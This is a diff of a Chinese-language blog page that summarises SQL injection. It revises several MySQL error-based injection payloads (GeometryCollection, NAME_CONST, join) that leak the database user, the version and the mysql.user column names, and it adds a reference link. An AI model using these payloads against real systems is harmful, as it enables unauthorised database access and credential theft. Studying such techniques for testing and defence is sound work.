@@ -124,7 +124,7 @@
 <meta property="og:image" content="https://chirec.github.io/2019/04/11/Sql-Injection/12.4.2.3.03.Result.png">
 <meta property="og:image" content="https://chirec.github.io/2019/04/11/Sql-Injection/12.4.2.4.01.Intruder-payload.png">
 <meta property="og:image" content="https://chirec.github.io/2019/04/11/Sql-Injection/12.4.2.4.02.Result.png">
-<meta property="og:updated_time" content="2019-04-21T05:03:20.661Z">
+<meta property="og:updated_time" content="2019-05-03T12:02:03.381Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="&#39;SQL注入总结&#39;">
 <meta name="twitter:description" content="1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件">
@@ -512,9 +512,12 @@
 <p>5.整个查询过程<code>floor(rand(0)*2)</code>被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。</p>
 <p>From：<a href="https://blog.51cto.com/chichu/2051375" target="_blank" rel="noopener">【学习笔记】MYSQL的floor报错原理分析总结</a></p>
 </blockquote>
-<h2 id="5-4-GeometryCollection"><a href="#5-4-GeometryCollection" class="headerlink" title="5.4 GeometryCollection()"></a>5.4 GeometryCollection()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection(()select *from(select user () )a)b );</span><br></pre></td></tr></table></figure>
-<h2 id="5-5-NAME-CONST"><a href="#5-5-NAME-CONST" class="headerlink" title="5.5 NAME_CONST()"></a>5.5 NAME_CONST()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exists(select*from (select*from(selectname_const(@@version,0))a join (select name_const(@@version,0))b)c)</span><br></pre></td></tr></table></figure>
-<h2 id="5-6-join"><a href="#5-6-join" class="headerlink" title="5.6 join"></a>5.6 join</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from(select * from mysql.user ajoin mysql.user b)c;</span><br></pre></td></tr></table></figure>
+<h2 id="5-4-GeometryCollection"><a href="#5-4-GeometryCollection" class="headerlink" title="5.4 GeometryCollection()"></a>5.4 GeometryCollection()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and GeometryCollection((select * from(select * from(select user ())a)b))</span><br></pre></td></tr></table></figure>
+<h2 id="5-5-NAME-CONST"><a href="#5-5-NAME-CONST" class="headerlink" title="5.5 NAME_CONST()"></a>5.5 NAME_CONST()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)</span><br></pre></td></tr></table></figure>
+<p>只能用来暴版本信息</p>
+<h2 id="5-6-join"><a href="#5-6-join" class="headerlink" title="5.6 join"></a>5.6 join</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and (select * from(select * from mysql.user a join mysql.user b)c)</span><br><span class="line">and (select * from (select * from mysql.user as a join mysql.user as b) as c)</span><br></pre></td></tr></table></figure>
+<p>只能用来暴列名，在暴出第一个列名后，在b后加上<code>using(columnname)</code>可以暴出第二个列名，使用<code>,</code>分隔，多个列名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select * from(select * from mysql.user a join mysql.user b using(Host,User,Password))c)</span><br></pre></td></tr></table></figure>
 <h2 id="5-7-exp"><a href="#5-7-exp" class="headerlink" title="5.7 exp()"></a>5.7 exp()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and exp(~(select * from (select user () ) a) );</span><br></pre></td></tr></table></figure>
 <h2 id="5-8-polygon"><a href="#5-8-polygon" class="headerlink" title="5.8 polygon()"></a>5.8 polygon()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and polygon (()select * from(select user ())a)b );</span><br></pre></td></tr></table></figure>
 <h2 id="5-9-multipoint"><a href="#5-9-multipoint" class="headerlink" title="5.9 multipoint()"></a>5.9 multipoint()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and multipoint (()select * from(select user() )a)b );</span><br></pre></td></tr></table></figure>
@@ -761,7 +764,7 @@
 <p>[4] <a href="https://stackoverflow.com/questions/134099/are-pdo-prepared-statements-sufficient-to-prevent-sql-injection/12202218#12202218" target="_blank" rel="noopener">are-pdo-prepared-statements-sufficient-to-prevent-sql-injection</a></p>
 <p>[5] <a href="http://www.laruence.com/2010/04/12/1396.html" target="_blank" rel="noopener">深入理解SET NAMES和mysql(i)_set_charset的区别</a></p>
 <p>[6] <a href="http://www.sqlinjection.net/heavy-query/" target="_blank" rel="noopener">Time-Based Blind SQL Injection using Heavy Query</a></p>
-<p>[7] </p>
+<p>[7] <a href="https://www.cnblogs.com/yuanzijian-ruiec/p/10794681.html" target="_blank" rel="noopener">mysql 二十余种报错注入姿势</a></p>
 
       
     </div>
@@ -879,7 +882,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-count">18</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
